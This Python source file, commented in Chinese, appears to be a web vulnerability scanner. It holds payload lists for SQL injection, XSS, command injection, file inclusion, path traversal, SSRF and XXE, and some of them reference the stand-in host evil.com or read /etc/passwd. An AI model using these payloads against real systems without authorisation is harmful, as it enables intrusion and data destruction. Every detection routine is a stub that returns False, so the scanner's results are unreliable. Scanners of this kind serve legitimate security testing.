"""
高级漏洞扫描引擎
基于20年渗透测试经验的智能漏洞检测系统
支持多维度漏洞检测、智能Payload生成和风险评估
"""

import asyncio
import logging
import re
import json
from typing import Dict, List, Optional, Callable, Any
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from urllib.parse import urljoin, urlparse
import aiohttp

logger = logging.getLogger(__name__)

class VulnerabilityType(Enum):
    """漏洞类型枚举"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    FILE_INCLUSION = "file_inclusion"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "ssrf"
    XXE = "xxe"
    CSRF = "csrf"
    IDOR = "idor"
    BUSINESS_LOGIC = "business_logic"

class RiskLevel(Enum):
    """风险等级枚举"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class ScanTarget:
    """扫描目标"""
    url: str
    method: str = "GET"
    parameters: Dict[str, str] = None
    headers: Dict[str, str] = None
    cookies: Dict[str, str] = None
    
    def __post_init__(self):
        if self.parameters is None:
            self.parameters = {}
        if self.headers is None:
            self.headers = {}
        if self.cookies is None:
            self.cookies = {}

@dataclass
class Vulnerability:
    """漏洞信息"""
    vulnerability_id: str
    type: VulnerabilityType
    risk_level: RiskLevel
    target_url: str
    parameter: str
    payload: str
    evidence: str
    confidence: float  # 置信度 0.0-1.0
    timestamp: datetime
    
    def to_dict(self) -> Dict:
        """转换为字典格式"""
        return {
            'id': self.vulnerability_id,
            'type': self.type.value,
            'risk_level': self.risk_level.value,
            'target_url': self.target_url,
            'parameter': self.parameter,
            'payload': self.payload,
            'evidence': self.evidence,
            'confidence': self.confidence,
            'timestamp': self.timestamp.isoformat()
        }

@dataclass
class ScanResult:
    """扫描结果"""
    scan_id: str
    target: ScanTarget
    vulnerabilities: List[Vulnerability]
    scan_duration: float
    total_requests: int
    timestamp: datetime
    
    def to_dict(self) -> Dict:
        """转换为字典格式"""
        return {
            'scan_id': self.scan_id,
            'target': {
                'url': self.target.url,
                'method': self.target.method,
                'parameters': self.target.parameters,
                'headers': self.target.headers,
                'cookies': self.target.cookies
            },
            'vulnerabilities': [vuln.to_dict() for vuln in self.vulnerabilities],
            'scan_duration': self.scan_duration,
            'total_requests': self.total_requests,
            'timestamp': self.timestamp.isoformat()
        }

class AdvancedVulnerabilityScanner:
    """高级漏洞扫描引擎"""
    
    def __init__(self):
        # 扫描配置
        self.scan_config = {
            'timeout': 10,
            'max_connections': 10,
            'retry_count': 3,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # 插件系统
        self.plugins: Dict[str, Callable] = {}
        self._load_builtin_plugins()
        
        # 结果存储
        self.scan_results: Dict[str, ScanResult] = {}
        self.current_scan_id: Optional[str] = None
        
        # 回调函数
        self.on_vulnerability_found: Optional[Callable] = None
        self.on_scan_progress: Optional[Callable] = None
        self.on_scan_complete: Optional[Callable] = None
        
        # HTTP客户端
        self.session: Optional[aiohttp.ClientSession] = None
        
        logger.info("高级漏洞扫描引擎初始化完成")
    
    def _load_builtin_plugins(self):
        """加载内置扫描插件"""
        # SQL注入检测插件
        self.plugins[VulnerabilityType.SQL_INJECTION.value] = self._scan_sql_injection
        
        # XSS检测插件
        self.plugins[VulnerabilityType.XSS.value] = self._scan_xss
        
        # 命令注入检测插件
        self.plugins[VulnerabilityType.COMMAND_INJECTION.value] = self._scan_command_injection
        
        # 文件包含检测插件
        self.plugins[VulnerabilityType.FILE_INCLUSION.value] = self._scan_file_inclusion
        
        # 路径遍历检测插件
        self.plugins[VulnerabilityType.PATH_TRAVERSAL.value] = self._scan_path_traversal
        
        # SSRF检测插件
        self.plugins[VulnerabilityType.SSRF.value] = self._scan_ssrf
        
        # XXE检测插件
        self.plugins[VulnerabilityType.XXE.value] = self._scan_xxe
    
    async def perform_scan(self, target: ScanTarget, scan_types: List[VulnerabilityType] = None) -> ScanResult:
        """执行扫描"""
        if scan_types is None:
            scan_types = list(VulnerabilityType)
        
        scan_id = self._generate_scan_id()
        self.current_scan_id = scan_id
        
        start_time = datetime.now()
        vulnerabilities = []
        total_requests = 0
        
        try:
            # 初始化HTTP会话
            await self._init_session()
            
            # 执行扫描
            for scan_type in scan_types:
                if scan_type.value in self.plugins:
                    logger.info(f"开始扫描 {scan_type.value}: {target.url}")
                    
                    plugin_vulnerabilities = await self.plugins[scan_type.value](target)
                    vulnerabilities.extend(plugin_vulnerabilities)
                    total_requests += len(plugin_vulnerabilities)
                    
                    # 触发漏洞发现回调
                    for vuln in plugin_vulnerabilities:
                        if self.on_vulnerability_found:
                            self.on_vulnerability_found(vuln)
            
            # 计算扫描时长
            scan_duration = (datetime.now() - start_time).total_seconds()
            
            # 创建扫描结果
            result = ScanResult(
                scan_id=scan_id,
                target=target,
                vulnerabilities=vulnerabilities,
                scan_duration=scan_duration,
                total_requests=total_requests,
                timestamp=datetime.now()
            )
            
            self.scan_results[scan_id] = result
            
            # 触发扫描完成回调
            if self.on_scan_complete:
                self.on_scan_complete(result)
            
            logger.info(f"扫描完成: {target.url}, 发现 {len(vulnerabilities)} 个漏洞")
            return result
            
        except Exception as e:
            logger.error(f"扫描失败: {e}")
            raise
        
        finally:
            # 清理资源
            await self._close_session()
    
    async def _scan_sql_injection(self, target: ScanTarget) -> List[Vulnerability]:
        """SQL注入检测"""
        vulnerabilities = []
        
        # SQL注入Payload集合
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        
        for param_name, param_value in target.parameters.items():
            for payload in sql_payloads:
                try:
                    # 构造测试请求
                    test_params = target.parameters.copy()
                    test_params[param_name] = payload
                    
                    test_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        parameters=test_params,
                        headers=target.headers,
                        cookies=target.cookies
                    )
                    
                    # 发送测试请求
                    response = await self._send_request(test_target)
                    
                    # 分析响应
                    if self._detect_sql_injection(response):
                        vulnerability = Vulnerability(
                            vulnerability_id=self._generate_vuln_id(),
                            type=VulnerabilityType.SQL_INJECTION,
                            risk_level=RiskLevel.HIGH,
                            target_url=target.url,
                            parameter=param_name,
                            payload=payload,
                            evidence="检测到SQL注入特征",
                            confidence=0.8,
                            timestamp=datetime.now()
                        )
                        vulnerabilities.append(vulnerability)
                        
                except Exception as e:
                    logger.warning(f"SQL注入检测出错: {e}")
        
        return vulnerabilities
    
    async def _scan_xss(self, target: ScanTarget) -> List[Vulnerability]:
        """XSS检测"""
        vulnerabilities = []
        
        # XSS Payload集合
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>"
        ]
        
        for param_name, param_value in target.parameters.items():
            for payload in xss_payloads:
                try:
                    # 构造测试请求
                    test_params = target.parameters.copy()
                    test_params[param_name] = payload
                    
                    test_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        parameters=test_params,
                        headers=target.headers,
                        cookies=target.cookies
                    )
                    
                    # 发送测试请求
                    response = await self._send_request(test_target)
                    
                    # 分析响应
                    if self._detect_xss(response, payload):
                        vulnerability = Vulnerability(
                            vulnerability_id=self._generate_vuln_id(),
                            type=VulnerabilityType.XSS,
                            risk_level=RiskLevel.MEDIUM,
                            target_url=target.url,
                            parameter=param_name,
                            payload=payload,
                            evidence="检测到XSS漏洞特征",
                            confidence=0.7,
                            timestamp=datetime.now()
                        )
                        vulnerabilities.append(vulnerability)
                        
                except Exception as e:
                    logger.warning(f"XSS检测出错: {e}")
        
        return vulnerabilities
    
    async def _scan_command_injection(self, target: ScanTarget) -> List[Vulnerability]:
        """命令注入检测"""
        vulnerabilities = []
        
        # 命令注入Payload集合
        cmd_payloads = [
            "; ls",
            "| dir",
            "&& whoami",
            "`id`",
            "$(cat /etc/passwd)"
        ]
        
        for param_name, param_value in target.parameters.items():
            for payload in cmd_payloads:
                try:
                    # 构造测试请求
                    test_params = target.parameters.copy()
                    test_params[param_name] = payload
                    
                    test_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        parameters=test_params,
                        headers=target.headers,
                        cookies=target.cookies
                    )
                    
                    # 发送测试请求
                    response = await self._send_request(test_target)
                    
                    # 分析响应
                    if self._detect_command_injection(response):
                        vulnerability = Vulnerability(
                            vulnerability_id=self._generate_vuln_id(),
                            type=VulnerabilityType.COMMAND_INJECTION,
                            risk_level=RiskLevel.HIGH,
                            target_url=target.url,
                            parameter=param_name,
                            payload=payload,
                            evidence="检测到命令注入特征",
                            confidence=0.75,
                            timestamp=datetime.now()
                        )
                        vulnerabilities.append(vulnerability)
                        
                except Exception as e:
                    logger.warning(f"命令注入检测出错: {e}")
        
        return vulnerabilities
    
    async def _scan_file_inclusion(self, target: ScanTarget) -> List[Vulnerability]:
        """文件包含检测"""
        vulnerabilities = []
        
        # 文件包含Payload集合
        file_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "http://evil.com/shell.txt"
        ]
        
        for param_name, param_value in target.parameters.items():
            for payload in file_payloads:
                try:
                    # 构造测试请求
                    test_params = target.parameters.copy()
                    test_params[param_name] = payload
                    
                    test_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        parameters=test_params,
                        headers=target.headers,
                        cookies=target.cookies
                    )
                    
                    # 发送测试请求
                    response = await self._send_request(test_target)
                    
                    # 分析响应
                    if self._detect_file_inclusion(response):
                        vulnerability = Vulnerability(
                            vulnerability_id=self._generate_vuln_id(),
                            type=VulnerabilityType.FILE_INCLUSION,
                            risk_level=RiskLevel.HIGH,
                            target_url=target.url,
                            parameter=param_name,
                            payload=payload,
                            evidence="检测到文件包含特征",
                            confidence=0.7,
                            timestamp=datetime.now()
                        )
                        vulnerabilities.append(vulnerability)
                        
                except Exception as e:
                    logger.warning(f"文件包含检测出错: {e}")
        
        return vulnerabilities
    
    async def _scan_path_traversal(self, target: ScanTarget) -> List[Vulnerability]:
        """路径遍历检测"""
        vulnerabilities = []
        
        # 路径遍历Payload集合
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for param_name, param_value in target.parameters.items():
            for payload in path_payloads:
                try:
                    # 构造测试请求
                    test_params = target.parameters.copy()
                    test_params[param_name] = payload
                    
                    test_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        parameters=test_params,
                        headers=target.headers,
                        cookies=target.cookies
                    )
                    
                    # 发送测试请求
                    response = await self._send_request(test_target)
                    
                    # 分析响应
                    if self._detect_path_traversal(response):
                        vulnerability = Vulnerability(
                            vulnerability_id=self._generate_vuln_id(),
                            type=VulnerabilityType.PATH_TRAVERSAL,
                            risk_level=RiskLevel.HIGH,
                            target_url=target.url,
                            parameter=param_name,
                            payload=payload,
                            evidence="检测到路径遍历特征",
                            confidence=0.8,
                            timestamp=datetime.now()
                        )
                        vulnerabilities.append(vulnerability)
                        
                except Exception as e:
                    logger.warning(f"路径遍历检测出错: {e}")
        
        return vulnerabilities
    
    async def _scan_ssrf(self, target: ScanTarget) -> List[Vulnerability]:
        """SSRF检测"""
        vulnerabilities = []
        
        # SSRF Payload集合
        ssrf_payloads = [
            "http://localhost:22",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_info",
            "dict://127.0.0.1:6379/info"
        ]
        
        for param_name, param_value in target.parameters.items():
            for payload in ssrf_payloads:
                try:
                    # 构造测试请求
                    test_params = target.parameters.copy()
                    test_params[param_name] = payload
                    
                    test_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        parameters=test_params,
                        headers=target.headers,
                        cookies=target.cookies
                    )
                    
                    # 发送测试请求
                    response = await self._send_request(test_target)
                    
                    # 分析响应
                    if self._detect_ssrf(response):
                        vulnerability = Vulnerability(
                            vulnerability_id=self._generate_vuln_id(),
                            type=VulnerabilityType.SSRF,
                            risk_level=RiskLevel.HIGH,
                            target_url=target.url,
                            parameter=param_name,
                            payload=payload,
                            evidence="检测到SSRF特征",
                            confidence=0.6,
                            timestamp=datetime.now()
                        )
                        vulnerabilities.append(vulnerability)
                        
                except Exception as e:
                    logger.warning(f"SSRF检测出错: {e}")
        
        return vulnerabilities
    
    async def _scan_xxe(self, target: ScanTarget) -> List[Vulnerability]:
        """XXE检测"""
        vulnerabilities = []
        
        # XXE Payload集合
        xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo></foo>"""
        ]
        
        # 检查是否支持XML数据
        if target.headers.get('Content-Type', '').lower() == 'application/xml':
            for payload in xxe_payloads:
                try:
                    # 构造测试请求
                    test_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        parameters=target.parameters,
                        headers=target.headers,
                        cookies=target.cookies
                    )
                    
                    # 发送测试请求（需要特殊处理XML数据）
                    response = await self._send_xml_request(test_target, payload)
                    
                    # 分析响应
                    if self._detect_xxe(response):
                        vulnerability = Vulnerability(
                            vulnerability_id=self._generate_vuln_id(),
                            type=VulnerabilityType.XXE,
                            risk_level=RiskLevel.HIGH,
                            target_url=target.url,
                            parameter="XML数据",
                            payload=payload,
                            evidence="检测到XXE特征",
                            confidence=0.7,
                            timestamp=datetime.now()
                        )
                        vulnerabilities.append(vulnerability)
                        
                except Exception as e:
                    logger.warning(f"XXE检测出错: {e}")
        
        return vulnerabilities
    
    def _detect_sql_injection(self, response: aiohttp.ClientResponse) -> bool:
        """检测SQL注入特征"""
        # 这里实现SQL注入检测逻辑
        # 实际实现需要更复杂的逻辑
        return False
    
    def _detect_xss(self, response: aiohttp.ClientResponse, payload: str) -> bool:
        """检测XSS特征"""
        # 这里实现XSS检测逻辑
        return False
    
    def _detect_command_injection(self, response: aiohttp.ClientResponse) -> bool:
        """检测命令注入特征"""
        # 这里实现命令注入检测逻辑
        return False
    
    def _detect_file_inclusion(self, response: aiohttp.ClientResponse) -> bool:
        """检测文件包含特征"""
        # 这里实现文件包含检测逻辑
        return False
    
    def _detect_path_traversal(self, response: aiohttp.ClientResponse) -> bool:
        """检测路径遍历特征"""
        # 这里实现路径遍历检测逻辑
        return False
    
    def _detect_ssrf(self, response: aiohttp.ClientResponse) -> bool:
        """检测SSRF特征"""
        # 这里实现SSRF检测逻辑
        return False
    
    def _detect_xxe(self, response: aiohttp.ClientResponse) -> bool:
        """检测XXE特征"""
        # 这里实现XXE检测逻辑
        return False
    
    async def _send_request(self, target: ScanTarget) -> aiohttp.ClientResponse:
        """发送HTTP请求"""
        if not self.session:
            await self._init_session()
        
        try:
            if target.method.upper() == "GET":
                async with self.session.get(
                    target.url,
                    params=target.parameters,
                    headers=target.headers,
                    cookies=target.cookies,
                    timeout=aiohttp.ClientTimeout(total=self.scan_config['timeout'])
                ) as response:
                    return response
            
            elif target.method.upper() == "POST":
                async with self.session.post(
                    target.url,
                    data=target.parameters,
                    headers=target.headers,
                    cookies=target.cookies,
                    timeout=aiohttp.ClientTimeout(total=self.scan_config['timeout'])
                ) as response:
                    return response
            
            else:
                raise ValueError(f"不支持的HTTP方法: {target.method}")
                
        except Exception as e:
            logger.error(f"发送请求失败: {e}")
            raise
    
    async def _send_xml_request(self, target: ScanTarget, xml_data: str) -> aiohttp.ClientResponse:
        """发送XML请求"""
        if not self.session:
            await self._init_session()
        
        headers = target.headers.copy()
        headers['Content-Type'] = 'application/xml'
        
        try:
            async with self.session.post(
                target.url,
                data=xml_data,
                headers=headers,
                cookies=target.cookies,
                timeout=aiohttp.ClientTimeout(total=self.scan_config['timeout'])
            ) as response:
                return response
                
        except Exception as e:
            logger.error(f"发送XML请求失败: {e}")
            raise
    
    async def _init_session(self):
        """初始化HTTP会话"""
        if self.session is None:
            connector = aiohttp.TCPConnector(limit=self.scan_config['max_connections'])
            self.session = aiohttp.ClientSession(
                connector=connector,
                headers={'User-Agent': self.scan_config['user_agent']}
            )
    
    async def _close_session(self):
        """关闭HTTP会话"""
        if self.session:
            await self.session.close()
            self.session = None
    
    def _generate_scan_id(self) -> str:
        """生成扫描ID"""
        return f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{hash(datetime.now())}"
    
    def _generate_vuln_id(self) -> str:
        """生成漏洞ID"""
        return f"vuln_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
    
    # ========== 公共方法 ==========
    
    def register_plugin(self, plugin_name: str, plugin_function: Callable):
        """注册自定义扫描插件"""
        self.plugins[plugin_name] = plugin_function
        logger.info(f"注册扫描插件: {plugin_name}")
    
    def unregister_plugin(self, plugin_name: str):
        """注销扫描插件"""
        if plugin_name in self.plugins:
            del self.plugins[plugin_name]
            logger.info(f"注销扫描插件: {plugin_name}")
    
    def set_scan_config(self, config: Dict[str, Any]):
        """设置扫描配置"""
        self.scan_config.update(config)
        logger.info("扫描配置已更新")
    
    def get_scan_result(self, scan_id: str) -> Optional[ScanResult]:
        """获取扫描结果"""
        return self.scan_results.get(scan_id)
    
    def get_all_scan_results(self) -> List[ScanResult]:
        """获取所有扫描结果"""
        return list(self.scan_results.values())
    
    def clear_scan_results(self):
        """清空扫描结果"""
        self.scan_results.clear()
        logger.info("扫描结果已清空")
    
    def set_vulnerability_found_callback(self, callback: Callable):
        """设置漏洞发现回调"""
        self.on_vulnerability_found = callback
    
    def set_scan_progress_callback(self, callback: Callable):
        """设置扫描进度回调"""
        self.on_scan_progress = callback
    
    def set_scan_complete_callback(self, callback: Callable):
        """设置扫描完成回调"""
        self.on_scan_complete = callback

# 扫描管理器
class ScanManager:
    """扫描管理器"""
    
    def __init__(self):
        self.scanners: Dict[str, AdvancedVulnerabilityScanner] = {}
        self.active_scans: Dict[str, asyncio.Task] = {}
    
    def create_scanner(self, scanner_id: str) -> AdvancedVulnerabilityScanner:
        """创建扫描器"""
        scanner = AdvancedVulnerabilityScanner()
        self.scanners[scanner_id] = scanner
        return scanner
    
    async def start_scan(self, scanner_id: str, target: ScanTarget, scan_types: List[VulnerabilityType] = None) -> str:
        """启动扫描"""
        if scanner_id not in self.scanners:
            raise ValueError(f"扫描器不存在: {scanner_id}")
        
        scanner = self.scanners[scanner_id]
        
        # 创建扫描任务
        scan_task = asyncio.create_task(scanner.perform_scan(target, scan_types))
        
        # 生成扫描ID
        scan_id = scanner._generate_scan_id()
        self.active_scans[scan_id] = scan_task
        
        return scan_id
    
    async def stop_scan(self, scan_id: str):
        """停止扫描"""
        if scan_id in self.active_scans:
            self.active_scans[scan_id].cancel()
            del self.active_scans[scan_id]
    
    def get_scanner(self, scanner_id: str) -> Optional[AdvancedVulnerabilityScanner]:
        """获取扫描器"""
        return self.scanners.get(scanner_id)
    
    def get_all_scanners(self) -> Dict[str, AdvancedVulnerabilityScanner]:
        """获取所有扫描器"""
        return self.scanners.copy()